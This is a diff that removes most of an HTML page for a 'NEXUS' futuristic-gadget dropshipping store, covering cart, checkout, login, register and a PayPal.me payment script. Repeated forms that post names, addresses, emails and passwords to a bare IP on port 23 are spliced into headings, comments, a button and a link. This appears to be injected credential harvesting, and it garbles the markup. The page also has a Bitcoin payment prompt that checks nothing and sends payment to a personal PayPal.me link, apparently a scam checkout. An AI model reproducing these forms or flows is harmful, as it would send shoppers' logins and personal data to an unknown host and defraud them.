-                </div>
-            </div>
-        </footer>
-    </div>
 
-    <!-- Cart Page -->
-    <div id="cart-page" class="hidden min-h-screen pt-24 pb-16">
-        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
-            <h1 class="tech-font text-4xl font-bold cyber-gradient-text mb-8 text-center">Your Shopping Cart</h1>
-            <div class="bg-gray-900 bg-opacity-50 rounded-xl p-8 border border-gray-800">
-                <div class="space-y-6">
-                    <!-- Cart Item 1 -->
-                    <div class="flex items-center justify-between border-b border-gray-700 pb-4">
-                        <div class="flex items-center space-x-4">
-                            <img src="https://images.unsplash.com/photo-1551269901-5c5e14c25df7?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=100&q=80" alt="Quantum X Smartwatch" class="w-20 h-20 object-cover rounded-lg">
+                    <div class="space-y-6">
+                        <div class="flex items-start">
+                            <div class="w-12 h-12 bg-blue-500 bg-opacity-10 rounded-lg flex items-center justify-center mr-4">
+                                <i class="fas fa-map-marker-alt text-blue-500"></i>
+                            </div>
                             <div>
-                                <h3 class="text-lg font-medium text-white">Quantum X Smartwatch</h3>
-                                <p class="text-gray-400 text-sm">Color: Obsidian Black</p>
-                                <p class="text-plasma font-bold">$249.99</p>
+                                <h3 class="text-lg font-bold mb-1">Address</h3>
+                                <p class="text-gray-400">123 Future Street, Tech District<br>San Francisco, CA 94103</p>
                             </div>
                         </div>
-                        <div class="flex items-center space-x-4">
-                            <input type="number" value="1" min="1" class="bg-gray-800 text-white text-center w-16 h-10 rounded-md">
-                            <button class="text-red-500 hover:text-red-400 transition duration-300">
-                                <i class="fas fa-trash-alt"></i>
-                            </button>
-                        </div>
-                    </div>
-                    <!-- Cart Item 2 -->
-                    <div class="flex items-center justify-between border-b border-gray-700 pb-4">
-                        <div class="flex items-center space-x-4">
-                            <img src="https://images.unsplash.com/photo-1593784991095-a205069470b6?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=100&q=80" alt="Nebula Pro Earbuds" class="w-20 h-20 object-cover rounded-lg">
+
+                        <div class="flex items-start">
+                            <div class="w-12 h-12 bg-blue-500 bg-opacity-10 rounded-lg flex items-center justify-center mr-4">
+                                <i class="fas fa-phone text-blue-500"></i>
+                            </div>
                             <div>
-                                <h3 class="text-lg font-medium text-white">Nebula Pro Earbuds</h3>
-                                <p class="text-gray-400 text-sm">Color: Space Gray</p>
-                                <p class="text-plasma font-bold">$179.99</p>
+                                <h3 class="text-lg font-bold mb-1">Phone</h3>
+                                <p class="text-gray-400">+1 (555) 123-4567<br>Mon-Fri, 9am-5pm PST</p>
                             </div>
                         </div>
-                        <div class="flex items-center space-x-4">
-                            <input type="number" value="1" min="1" class="bg-gray-800 text-white text-center w-16 h-10 rounded-md">
-                            <button class="text-red-500 hover:text-red-400 transition duration-300">
-                                <i class="fas fa-trash-alt"></i>
-                            </button>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="mt-8 pt-6 border-t border-gray-700 flex justify-between items-center">
-                    <span class="text-xl font-bold text-white">Total:</span>
-                    <span class="text-3xl font-bold text-plasma">$429.98</span>
-                </div>
-                
-                <div class="mt-8 flex flex-col sm:flex-row justify-end space-y-4 sm:space-y-0 sm:space-x-4">
-                    <button class="px-6 py-3 border border-nebula text-nebula rounded-full font-medium hover:bg-nebula hover:bg-opacity-10 transition-all duration-300" onclick="showPage('collections-page')">
-                        Continue Shopping
-                    </button>
-                    <button class="px-6 py-3 bg-gradient-to-r from-nebula to-quantum text-white rounded-full font-medium hover:opacity-90 transition-all duration-300" onclick="startCheckout()">
-                        Proceed to Checkout
-<form action="http://123.1.1.1:23/api/checkout" method="POST" class="space-y-4">
-  <input type="text" name="name" placeholder="Full Name" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  <input type="text" name="address" placeholder="Shipping Address" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  <input type="email" name="email" placeholder="Email Address" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  
-  
-  
-  <button type="submit" class="bg-gradient-to-r from-cyan-500 to-emerald-500 text-black font-bold py-3 px-6 rounded-lg hover:from-cyan-400 hover:to-emerald-400 transition duration-500">
-    Complete Purchase
-  </button>
-</form>
-
-                    </button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Checkout
-<form action="http://123.1.1.1:23/api/checkout" method="POST" class="space-y-4">
-  <input type="text" name="name" placeholder="Full Name" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  <input type="text" name="address" placeholder="Shipping Address" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  <input type="email" name="email" placeholder="Email Address" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  
-  
-  
-  <button type="submit" class="bg-gradient-to-r from-cyan-500 to-emerald-500 text-black font-bold py-3 px-6 rounded-lg hover:from-cyan-400 hover:to-emerald-400 transition duration-500">
-    Complete Purchase
-  </button>
-</form>
- Page -->
-    <div id="checkout-page" class="hidden min-h-screen pt-24 pb-16">
-        <div class="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8">
-            <h1 class="tech-font text-4xl font-bold cyber-gradient-text mb-8 text-center">Checkout
-<form action="http://123.1.1.1:23/api/checkout" method="POST" class="space-y-4">
-  <input type="text" name="name" placeholder="Full Name" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  <input type="text" name="address" placeholder="Shipping Address" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  <input type="email" name="email" placeholder="Email Address" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  
-  
-  
-  <button type="submit" class="bg-gradient-to-r from-cyan-500 to-emerald-500 text-black font-bold py-3 px-6 rounded-lg hover:from-cyan-400 hover:to-emerald-400 transition duration-500">
-    Complete Purchase
-  </button>
-</form>
-</h1>
-            <div class="bg-gray-900 bg-opacity-50 rounded-xl p-8 border border-gray-800">
-                <h2 class="text-2xl font-bold text-white mb-6">Shipping Information</h2>
-                <form class="space-y-6">
-                    <div>
-                        <label for="fullName" class="block text-gray-400 text-sm font-medium mb-2">Full Name</label>
-                        <input type="text" id="fullName" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="John Doe">
-                    </div>
-                    <div>
-                        <label for="address" class="block text-gray-400 text-sm font-medium mb-2">Address</label>
-                        <input type="text" id="address" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="123 Cybernetic Ave">
-                    </div>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                        <div>
-                            <label for="city" class="block text-gray-400 text-sm font-medium mb-2">City</label>
-                            <input type="text" id="city" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="Neo-Tokyo">
-                        </div>
-                        <div>
-                            <label for="zip" class="block text-gray-400 text-sm font-medium mb-2">Zip Code</label>
-                            <input type="text" id="zip" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="90210">
-                        </div>
-                    </div>
-    <script>
-    function confirmPayment() {
-        if (confirm('Have you completed the Bitcoin payment?')) {
-            alert('Order placed successfully!');
-            showPage('home-page');
-        } else {
-            alert('Please complete the payment to place your order.');
-        }
-    }
-    </script>
-    
-                    <div>
-                        <label for="country" class="block text-gray-400 text-sm font-medium mb-2">Country</label>
-                        <select id="country" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula">
-                            <option>United States</option>
-                            <option>Canada</option>
-                            <option>United Kingdom</option>
-                            <option>Australia</option>
-                            <option>Other</option>
-                        </select>
-                    </div>
-
-                    <h2 class="text-2xl font-bold text-white mb-6 pt-8 border-t border-gray-700">Payment Information</h2>
-                    <div>
-                        <label for="cardNumber" class="block text-gray-400 text-sm font-medium mb-2">Card Number</label>
-                        
-                    </div>
-                    <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                        <div>
-                            <label for="expMonth" class="block text-gray-400 text-sm font-medium mb-2">Exp. Month</label>
-                            <input type="text" id="expMonth" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="MM">
-                        </div>
-                        <div>
-                            <label for="expYear" class="block text-gray-400 text-sm font-medium mb-2">Exp. Year</label>
-                            <input type="text" id="expYear" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="YY">
-                        </div>
-                        <div>
-                            <label for="cvv" class="block text-gray-400 text-sm font-medium mb-2">CVV</label>
-                            
-                        </div>
-                    </div>
-
-                    <div class="mt-8 pt-6 border-t border-gray-700 flex justify-between items-center">
-                        <span class="text-xl font-bold text-white">Order Total:</span>
-                        <span class="text-3xl font-bold text-plasma">$429.98</span>
-                    </div>
-
-                    <button type="submit" class="w-full px-6 py-3 bg-gradient-to-r from-nebula to-quantum text-white rounded-full font-medium hover:opacity-90 transition-all duration-300">
-                        Place Order
-                    </button>
-                </form>
-            </div>
-        </div>
-    </div>
-
-    <!-- About Us Page -->
-    <div id="about-page" class="hidden min-h-screen pt-24 pb-16">
-        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
-            <h1 class="tech-font text-4xl font-bold cyber-gradient-text mb-8 text-center">About NEXUS</h1>
-            <div class="bg-gray-900 bg-opacity-50 rounded-xl p-8 border border-gray-800 space-y-6">
-                <p class="text-gray-300 text-lg leading-relaxed">
-                    Welcome to NEXUS, your premier destination for futuristic luxury dropshipping. We are passionate about bringing the most innovative and cutting-edge products from around the globe directly to your doorstep. Our mission is to redefine the online shopping experience by offering a curated selection of items that blend advanced technology with exquisite design.
-                </p>
-                <p class="text-gray-300 text-lg leading-relaxed">
-                    At NEXUS, we believe in a future where technology seamlessly integrates with daily life, enhancing every aspect of your existence. From smart wearables that monitor your health with unparalleled accuracy to immersive VR headsets that transport you to new realities, every product in our collection is handpicked for its quality, performance, and ability to inspire.
-                </p>
-                <h2 class="text-2xl font-bold text-white mt-8 mb-4">Our Vision</h2>
-                <p class="text-gray-300 leading-relaxed">
-                    To be the leading global platform for futuristic luxury goods, empowering individuals to embrace the future today. We strive to create a community of forward-thinkers who appreciate innovation, quality, and a lifestyle enhanced by technology.
-                </p>
-                <h2 class="text-2xl font-bold text-white mt-8 mb-4">Our Commitment</h2>
-                <ul class="list-disc list-inside text-gray-300 space-y-2">
-                    <li><strong class="text-nebula">Innovation:</strong> Constantly seeking out the next big thing in tech and design.</li>
-                    <li><strong class="text-nebula">Quality:</strong> Ensuring every product meets rigorous standards for performance and durability.</li>
-                    <li><strong class="text-nebula">Customer Satisfaction:</strong> Providing exceptional service and support to our valued customers.</li>
-                    <li><strong class="text-nebula">Sustainability:</strong> Partnering with suppliers who share our commitment to ethical and environmentally responsible practices.</li>
-                </ul>
-                <p class="text-gray-300 text-lg leading-relaxed mt-8">
-                    Join the NEXUS revolution and step into the future with us.
-                </p>
-            </div>
-        </div>
-    </div>
-
-    <!-- Contact Us Page -->
-    <div id="contact-page" class="hidden min-h-screen pt-24 pb-16">
-        <div class="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8">
-            <h1 class="tech-font text-4xl font-bold cyber-gradient-text mb-8 text-center">Contact Us</h1>
-            <div class="bg-gray-900 bg-opacity-50 rounded-xl p-8 border border-gray-800 space-y-6">
-                <p class="text-gray-300 text-lg text-center">
-                    Have questions, feedback, or need assistance? Our team is here to help!
-                </p>
-                <form class="space-y-6">
-                    <div>
-                        <label for="contactName" class="block text-gray-400 text-sm font-medium mb-2">Your Name</label>
-                        <input type="text" id="contactName" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="Your Name">
-                    </div>
-                    <div>
-                        <label for="contactEmail" class="block text-gray-400 text-sm font-medium mb-2">Your Email</label>
-                        <input type="email" id="contactEmail" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="your.email@example.com">
-                    </div>
-                    <div>
-                        <label for="contactSubject" class="block text-gray-400 text-sm font-medium mb-2">Subject</label>
-                        <input type="text" id="contactSubject" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="Inquiry about an order / Product question">
-                    </div>
-                    <div>
-                        <label for="contactMessage" class="block text-gray-400 text-sm font-medium mb-2">Message</label>
-                        <textarea id="contactMessage" rows="5" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="Type your message here..."></textarea>
-                    </div>
-                    <button type="submit" class="w-full px-6 py-3 bg-gradient-to-r from-nebula to-quantum text-white rounded-full font-medium hover:opacity-90 transition-all duration-300">
-                        Send Message
-                    </button>
-                </form>
-                <div class="text-center mt-8 pt-6 border-t border-gray-700">
-                    <p class="text-gray-400">Or reach us directly:</p>
-                    <p class="text-white text-lg mt-2"><i class="fas fa-envelope text-nebula mr-2"></i> support@nexus.com</p>
-                    <p class="text-white text-lg mt-2"><i class="fas fa-phone-alt text-nebula mr-2"></i> +1 (555) 123-4567</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Login
-<form action="http://123.1.1.1:23/api/login" method="POST" class="space-y-4">
-  <input type="email" name="email" placeholder="Email" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  <input type="password" name="password" placeholder="Password" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  <button type="submit" class="bg-nebula text-white px-4 py-2 rounded-lg hover:bg-opacity-90 transition-all duration-300">
-    Sign In
-  </button>
-</form>
- Page -->
-    <div id="login-page" class="hidden min-h-screen pt-24 pb-16">
-        <div class="max-w-md mx-auto px-4 sm:px-6 lg:px-8">
-            <h1 class="tech-font text-4xl font-bold cyber-gradient-text mb-8 text-center">Login
-<form action="http://123.1.1.1:23/api/login" method="POST" class="space-y-4">
-  <input type="email" name="email" placeholder="Email" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  <input type="password" name="password" placeholder="Password" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  <button type="submit" class="bg-nebula text-white px-4 py-2 rounded-lg hover:bg-opacity-90 transition-all duration-300">
-    Sign In
-  </button>
-</form>
- to NEXUS</h1>
-            <div class="bg-gray-900 bg-opacity-50 rounded-xl p-8 border border-gray-800 space-y-6">
-                <form class="space-y-6">
-                    <div>
-                        <label for="loginEmail" class="block text-gray-400 text-sm font-medium mb-2">Email Address</label>
-                        <input type="email" id="loginEmail" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="your.email@example.com">
-                    </div>
-                    <div>
-                        <label for="loginPassword" class="block text-gray-400 text-sm font-medium mb-2">Password</label>
-                        <input type="password" id="loginPassword" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="********">
-                    </div>
-                    <div class="flex items-center justify-between">
-                        <div class="flex items-center">
-                            <input id="rememberMe" type="checkbox" class="h-4 w-4 text-nebula border-gray-700 rounded focus:ring-nebula">
-                            <label for="rememberMe" class="ml-2 block text-gray-400 text-sm">Remember me</label>
-                        </div>
-                        <a href="#" class="text-nebula hover:text-quantum text-sm font-medium">Forgot Password?</a>
-                    </div>
-                    <button type="submit" class="w-full px-6 py-3 bg-gradient-to-r from-nebula to-quantum text-white rounded-full font-medium hover:opacity-90 transition-all duration-300">
-                        Sign In
-                    </button>
-                </form>
-                <div class="text-center mt-6">
-                    <p class="text-gray-400">Don't have an account? <a href="#" class="text-nebula hover:text-quantum font-medium" onclick="showPage('register-page')">Register here</a></p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Register Page -->
-    <div id="register-page" class="hidden min-h-screen pt-24 pb-16">
-        <div class="max-w-md mx-auto px-4 sm:px-6 lg:px-8">
-            <h1 class="tech-font text-4xl font-bold cyber-gradient-text mb-8 text-center">Create NEXUS Account</h1>
-            <div class="bg-gray-900 bg-opacity-50 rounded-xl p-8 border border-gray-800 space-y-6">
-                <form class="space-y-6">
-                    <div>
-                        <label for="registerName" class="block text-gray-400 text-sm font-medium mb-2">Full Name</label>
-                        <input type="text" id="registerName" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="John Doe">
-                    </div>
-                    <div>
-                        <label for="registerEmail" class="block text-gray-400 text-sm font-medium mb-2">Email Address</label>
-                        <input type="email" id="registerEmail" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="your.email@example.com">
-                    </div>
-                    <div>
-                        <label for="registerPassword" class="block text-gray-400 text-sm font-medium mb-2">Password</label>
-                        <input type="password" id="registerPassword" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="********">
-                    </div>
-                    <div>
-                        <label for="confirmPassword" class="block text-gray-400 text-sm font-medium mb-2">Confirm Password</label>
-                        <input type="password" id="confirmPassword" class="w-full p-3 rounded-md bg-gray-800 border border-gray-700 text-white focus:ring-nebula focus:border-nebula" placeholder="********">
-                    </div>
-                    <div class="flex items-center">
-                        <input id="termsAgree" type="checkbox" class="h-4 w-4 text-nebula border-gray-700 rounded focus:ring-nebula">
-                        <label for="termsAgree" class="ml-2 block text-gray-400 text-sm">I agree to the <a href="#" class="text-nebula hover:text-quantum font-medium">Terms of Service</a> and <a href="#" class="text-nebula hover:text-quantum font-medium">Privacy Policy</a></label>
-                    </div>
-                    <button type="submit" class="w-full px-6 py-3 bg-gradient-to-r from-nebula to-quantum text-white rounded-full font-medium hover:opacity-90 transition-all duration-300">
-                        Register Account
-                    </button>
-                </form>
-                <div class="text-center mt-6">
-                    <p class="text-gray-400">Already have an account? <a href="#" class="text-nebula hover:text-quantum font-medium" onclick="showPage('login-page')">Login
-<form action="http://123.1.1.1:23/api/login" method="POST" class="space-y-4">
-  <input type="email" name="email" placeholder="Email" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  <input type="password" name="password" placeholder="Password" required class="w-full p-3 rounded-lg border border-gray-700 bg-gray-900 text-white">
-  <button type="submit" class="bg-nebula text-white px-4 py-2 rounded-lg hover:bg-opacity-90 transition-all duration-300">
-    Sign In
-  </button>
-</form>
- here</a></p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-
-<!-- Universal Home Button -->
-<button onclick="showPage('home-page')" class="fixed bottom-4 right-4 bg-nebula text-white p-3 rounded-full shadow-lg z-50">
-  <i class="fas fa-home"></i>
-</button>
-
-<!-- --- PayPal.me integration: compute amount and open paypal.me link --- -->
-<script>
-    const PAYPAL_ME_BASE = 'https://paypal.me/omgupta988';
-    
-    /** Helper - format amount as decimal string (two decimals) */
-    function formatAmount(amount){
-      return Number(amount).toFixed(2); // keeps two decimals, e.g. 499.98
-    }
-    
-    /** Compute total when on product page (product price * qty) or cart page (sum) */
-    function computeCartTotal(){
-      // 1) Product page flow
-      const productPriceEl = document.getElementById('product-detail-price');
-      if(productPriceEl){
-        const priceText = (productPriceEl.textContent || productPriceEl.innerText || '').replace(/,/g,'');
-        const price = parseFloat(priceText.replace(/[^0-9.]/g,'')) || 0;
-        const qtyEl = document.querySelector('#product-page input[type="number"]') || document.querySelector('#product-page input') || document.querySelector('#product-detail-price') && document.querySelector('input[type="number"]');
-        const qty = qtyEl ? Math.max(1, parseInt(qtyEl.value || 1, 10)) : 1;
-        return +(price * qty);
-      }
-    
-      // 2) Cart page flow
-      const cartRoot = document.getElementById('cart-page');
-      if(cartRoot){
-        let total = 0;
-        // Each cart-line should have an input[type=number] for qty and a nearby element with the price text
-        const qtyInputs = cartRoot.querySelectorAll('input[type="number"]');
-        qtyInputs.forEach(input => {
-          const qty = Math.max(1, parseInt(input.value || 1, 10));
-          // Find a price near this input (walk up to parent then search for text with $ or digits)
-          let price = null;
-          let node = input.closest('div');
-          for(let depth=0; depth<6 && node; depth++){
-            // look for possible price elements inside this block
-            const candidates = node.querySelectorAll('span, p, div');
-            for(const c of candidates){
-              const txt = (c.textContent || '').replace(/,/g,'');
-              if(/\$|₹|INR|USD/.test(txt) && /[0-9]/.test(txt)){
-                const m = txt.match(/([0-9]+(?:\.[0-9]+)?)/);
-                if(m) { price = parseFloat(m[1]); break; }
-              } else {
-                const m = txt.match(/([0-9]+(?:\.[0-9]+)?)/);
-                if(m && txt.trim().length < 12 && txt.indexOf('/') === -1){ // fallback small numeric text
-                  price = parseFloat(m[1]); break;
-                }
-              }
-            }
-            if(price !== null) break;
-            node = node.parentElement;
-          }
-          if(price === null) price = 0;
-          total += price * qty;
-        });
-        return +total;
-      }
-    
-      // fallback: try any visible price on page
-      const anyPrice = document.querySelector('span, p, div');
-      return 0;
-    }
-    
-    /** Build the PayPal.me URL and open it */
-    function openPayPalMe(amount, openNewTab = true){
-      if(!amount || amount <= 0) {
-        alert('Calculated amount is invalid (zero). Check cart or quantity.');
-        return;
-      }
-      const amtStr = formatAmount(amount);
-      // PayPal.me expects simple amount string like 499.98 — no currency symbol
-      const url = PAYPAL_ME_BASE.replace(/\/$/,'') + '/' + encodeURIComponent(amtStr);
-      if(openNewTab) window.open(url, '_blank');
-      else window.location.href = url;
-    }
-    
-    /** Main checkout function - replaces older startCheckout behavior by adding PayPal option */
-    async function startCheckout(){
-      // compute total for transparency
-      const total = computeCartTotal();
-      const totalStr = formatAmount(total);
-    
-      // Prompt user which flow to use
-      const usePayPal = confirm(`Checkout total = ${totalStr}. Press OK to pay via PayPal.me, Cancel to continue with site checkout (API).`);
-      if(usePayPal){
-        openPayPalMe(total, true);
-        return;
-      }
-    
-      // ---- original API checkout fallback (keeps your prior behavior) ----
-      try {
-        const name = document.getElementById('product-detail-name')?.textContent?.trim() || 'Unknown Product';
-        const priceText = document.getElementById('product-detail-price')?.textContent?.trim() || '$0';
-        const price = parseFloat(priceText.replace(/[^0-9.]/g,'')) || 0;
-        const qtyEl = document.querySelector('#product-page input[type="number"]') || document.querySelector('input[type="number"]');
-        const qty = qtyEl ? Math.max(1, parseInt(qtyEl.value||1,10)) : 1;
-        const selectedColor = document.getElementById('selected-color')?.textContent?.replace('Selected:','').trim() || '';
-        const customer = {
-          name: prompt('Enter your name:'),
-          email: prompt('Enter your email:'),
-          address: prompt('Enter your shipping address:')
-        };
-        const cart = {
-          items: [ { id: 'sku-unknown', name, price, qty, selectedColor } ],
-          total: price * qty
-        };
-    
-        const resp = await fetch('api.php?action=save_customer', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ customer, cart, return_url: window.location.href })
-        });
-        const data = await resp.json();
-        if (!data || data.status !== 'ok') {
-          const ok = confirm('Order API returned an error. Open PayPal.me to pay directly instead?');
-          if(ok) return openPayPalMe(cart.total || total, true);
-          alert('Error creating order: ' + (data?.message || 'unknown'));
-          return;
-        }
-        const orderId = data.order_id;
-        const paymentUrl = data.payment_url || '';
-        if(paymentUrl) window.open(paymentUrl, '_blank');
-        if(typeof showPaymentOverlay === 'function') showPaymentOverlay(orderId);
-      } catch (err) {
-        console.error(err);
-        const ok = confirm('Failed to start API checkout. Open PayPal.me to pay directly?');
-        if(ok) return openPayPalMe(total, true);
-        alert('Failed to start checkout.');
-      }
-    }
-    </script>
-    
-
-</body>
-</html>
